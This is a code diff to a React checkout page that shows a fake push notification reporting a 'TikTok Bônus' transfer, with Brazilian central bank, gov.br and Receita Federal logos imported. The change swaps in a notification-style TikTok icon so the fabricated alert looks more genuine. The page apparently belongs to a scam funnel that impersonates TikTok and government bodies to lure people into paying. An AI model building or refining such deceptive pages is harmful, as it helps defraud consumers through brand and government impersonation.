@@ -5,6 +5,7 @@ import { CheckCircle2, RefreshCw } from "lucide-react";
 import { trackTikTokEvent } from "@/lib/tiktok-tracking";
 import { TARGET_BALANCE } from "@/lib/constants";
 import tiktokLogo from "@/assets/tiktok-logo.png";
+import tiktokNotifIcon from "@/assets/tiktok-notif-icon.png";
 import bacenLogo from "@/assets/bacen-logo.png";
 import govbrLogo from "@/assets/govbr-logo.png";
 import receitaLogo from "@/assets/receita-federal-logo.png";
@@ -81,7 +82,7 @@ const Checkout = () => {
               }}
             >
               <div className="flex items-center gap-2.5 mb-1.5">
-                <img src={tiktokLogo} alt="TikTok" className="h-5 w-5 rounded-[5px] object-contain bg-black p-0.5 shrink-0" />
+                <img src={tiktokNotifIcon} alt="TikTok" className="h-5 w-5 rounded-[5px] object-cover shrink-0" />
                 <span className="text-[11px] font-semibold text-white/60 uppercase tracking-wider flex-1">TikTok Bônus</span>
                 <span className="text-[11px] text-white/40 font-medium">agora</span>
               </div>
@@ -101,7 +102,7 @@ const Checkout = () => {
               }}
             >
               <div className="flex items-center gap-2 mb-2">
-                <img src={tiktokLogo} alt="TikTok" className="h-4 w-4 rounded-sm object-contain bg-black shrink-0" />
+                <img src={tiktokNotifIcon} alt="TikTok" className="h-4 w-4 rounded-sm object-cover shrink-0" />
                 <span className="text-[11px] text-white/50 font-medium">TikTok Bônus</span>
                 <span className="text-[11px] text-white/35 mx-0.5">•</span>
                 <span className="text-[11px] text-white/35">agora</span>
@@ -113,7 +114,7 @@ const Checkout = () => {
                     Você recebeu uma transferência de R$ {TARGET.toFixed(2).replace(".", ",")} de TikTok Bônus.
                   </p>
                 </div>
-                <img src={tiktokLogo} alt="TikTok" className="h-10 w-10 rounded-xl object-contain bg-black p-1.5 shrink-0 mt-0.5" />
+                <img src={tiktokNotifIcon} alt="TikTok" className="h-10 w-10 rounded-xl object-cover shrink-0 mt-0.5" />
               </div>
             </div>
           )}
